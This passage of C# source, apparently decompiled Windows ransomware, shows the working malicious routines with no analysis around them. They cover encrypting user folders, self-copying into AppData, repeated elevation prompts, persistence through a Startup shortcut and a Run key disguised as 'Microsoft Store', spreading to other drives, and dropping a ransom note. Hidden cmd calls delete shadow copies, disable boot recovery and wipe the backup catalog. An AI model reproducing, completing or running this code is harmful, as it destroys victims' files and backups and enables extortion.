		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
